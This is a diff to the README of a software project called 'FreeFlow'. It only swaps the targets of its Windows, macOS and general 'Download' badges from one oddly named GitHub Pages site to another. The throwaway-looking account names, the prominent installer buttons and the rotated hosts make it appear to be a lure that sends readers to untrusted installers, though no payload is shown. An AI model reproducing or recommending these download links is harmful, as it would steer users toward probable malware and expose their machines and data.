@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, FreeFlow provides the tools you need to 
 
 <div align="center">
 
-[![Download FreeFlow](https://img.shields.io/badge/⬇_DOWNLOAD_FreeFlow-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download FreeFlow](https://img.shields.io/badge/⬇_DOWNLOAD_FreeFlow-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, FreeFlow provides the tools you need to 
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
